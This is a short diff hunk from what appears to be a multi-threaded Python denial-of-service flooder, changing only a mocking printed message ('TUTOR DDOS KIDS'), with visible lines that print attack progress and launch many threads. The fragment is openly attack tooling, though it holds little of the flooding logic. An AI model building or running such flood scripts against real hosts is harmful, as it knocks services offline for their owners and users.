@@ -60,7 +60,7 @@ def start():
             print("Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
         except:
             s.close()
-            print('YAHAHA MT YAKK')
+            print('~TUTOR DDOS KIDS 🤣')
 
 for x in range(thread):
     thred = threading.Thread(target=start)
